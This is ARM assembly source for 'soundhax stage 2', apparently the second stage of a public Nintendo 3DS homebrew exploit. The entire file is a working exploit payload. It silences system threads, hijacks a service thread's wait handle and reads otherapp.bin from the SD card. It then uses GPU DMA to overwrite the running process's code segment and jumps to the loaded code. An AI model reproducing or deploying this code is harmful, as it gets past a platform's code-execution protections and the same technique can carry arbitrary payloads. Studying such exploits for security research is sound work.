/* soundhax stage 2 */
/* ported by nedwill from freakyhax (plutoo), with permission */

#if defined(PRE21)
#include "stage2_constants_pre2.1.h"
#elif defined(V21AND22)
#include "stage2_constants_v2.1and2.2.h"
#else
#include "stage2_constants_post3.0.h"
#endif

#define OTHERAPP_ADDR 0x142C0000
#define OTHERAPP_SIZE 0xC000
#define OTHERAPP_CODE_VA 0x00101000

#define PARAMBLK_ADDR 0x14000000

.text
.global _start
_start:
/* OTHERAPP_CODE_GPU is in r5 */
/* Initialize stack. */
    mov  sp, #0x10000000
    sub  sp, #0x2C
/* Tell GSP thread to fuck off. */
    ldr  r0, =GSP_GET_INTERRUPTRECEIVER
    blx  r0
    mov  r1, #1
    strb r1, [r0, #0x77]
    ldr  r0, [r0, #0x2C]
    svc  0x18

/* Tell another problematic thread to fuck off as well. */
    ldr  r0, =THREAD8_OBJ
    mov  r1, #0
    strb r1, [r0, #0x0D]
    ldr  r0, =THREAD8_EVENT_HANDLE
    ldr  r0, [r0]
    svc  0x18

/*
 * A srv-notification thread is running that can't return from the thread-function.
 * Overwrite the handle it uses so that it won't return from svcWaitSynchronizationN
 * with the next call. Then send a notification so that it returns from waitsync and
 * uses the new handle.
 */
    mov r0, #0
    svc 0x17 // svcCreateEvent
    ldr r3, =SRV_SEMAPHORE
    str r1, [r3]

    ldr r0, =0x207
    mov r1, #0x1
    bl srv_PublishToSubscriber
/* Open otherapp.bin on sdcard root. */
    add  r0, sp, #0xC     // file_handle_out
    adr  r1, otherapp_str // path
    mov  r2, #1           // flags=FILE_READ
    ldr  r3, =FS_OPEN_FILE
    blx  r3
/* Read it into linear memory. */
    ldr  r1, [sp, #0xC] // file_handle
    add  r0, sp, #8     // bytes_read_out
    mov  r2, #0         // offset_lo
    mov  r3, #0         // offset_hi
    ldr  r4, =OTHERAPP_ADDR
    str  r4, [sp]       // dst
    ldr  r4, =OTHERAPP_SIZE
    str  r4, [sp, #4]   // size
    ldr  r4, =FS_READ_FILE
    blx  r4
/* Gspwn it to code segment. */
    mov  r0, r5             // dst
    ldr  r1, =OTHERAPP_ADDR // src
    ldr  r2, =OTHERAPP_SIZE // size
    bl   gsp_gxcmd_texturecopy
    bl   small_sleep
/* Grab GSP handle for next payload. */
    ldr  r0, =GSP_GET_HANDLE
    blx  r0
    mov  r3, r0
/* Set up param-blk for otherapp payload. */
    ldr  r0, =PARAMBLK_ADDR
    ldr  r1, =GSP_GX_CMD4
    str  r1, [r0, #0x1C] // gx_cmd4
    ldr  r1, =GSP_FLUSH_DATA_CACHE
    str  r1, [r0, #0x20] // flushdcache
    add  r2, r0, #0x48
    mov  r1, #0x8D       // flags
    str  r1, [r2]
    add  r2, r0, #0x58   // gsp_handle
    str  r3, [r2]
/* smea's magic does the rest. */
    add  sp, #0x2C
    ldr  r0, =PARAMBLK_ADDR  // param_blk
    ldr  r1, =0x10000000 - 4 // stack_ptr
    ldr  r2, =OTHERAPP_CODE_VA
    blx  r2
forever:
    b    forever

.pool
otherapp_str:
    .string16 "$sndsd:/otherapp.bin\0"
    .align 4

/* small_sleep: Sleep for a while. */
small_sleep:
    mov  r0, #0x10000000
    mov  r1, #0
    svc  0x0A // svcSleepThread
    bx   lr

/* gsp_gxcmd_texturecopy: Trigger GPU memcpy. */
gsp_gxcmd_texturecopy:
    push {r4, lr}
    sub  sp, #0x20
    mov  r3, #0

    mov  r4, #4          // cmd_type=TEXTURE_COPY
    str  r4, [sp]
    str  r1, [sp, #4]    // src_ptr=r1
    str  r0, [sp, #8]    // dst_ptr=r0
    str  r2, [sp, #0xC]  // size=r2
    str  r3, [sp, #0x10] // in_dimensions=0
    str  r3, [sp, #0x14] // out_dimensions=0
    mov  r4, #8
    str  r4, [sp, #0x18] // flags=8
    str  r3, [sp, #0x1C] // unused=0

    mov  r0, sp
    bl   gsp_execute_gpu_cmd
    add  sp, #0x20
    pop  {r4, pc}
.pool

gsp_execute_gpu_cmd:
    push {r4, lr}
    mov  r1, r0
    ldr  r4, =GSP_GET_INTERRUPTRECEIVER
    blx  r4
    add  r0, #0x58
    ldr  r4, =GSP_ENQUEUE_CMD
    blx  r4
    pop  {r4, pc}
.pool

srv_PublishToSubscriber:
    push {r4, lr}
    mrc p15, 0, r4, cr13, cr0, 3
    add r4, r4, #0x80

    ldr r2, =0x000C0080
    str r2, [r4, #0]
    str r0, [r4, #4]
    str r1, [r4, #8]

    ldr r0, =SRV_SESSIONHANDLE
    ldr r0, [r0]
    svc 0x32

    cmp r0, #0
    ldrge r0, [r4, #4]
    pop {r4, pc}
.pool

/* Force assembler error if payload becomes greater than 0x800. */
.org 0x300, 0x45
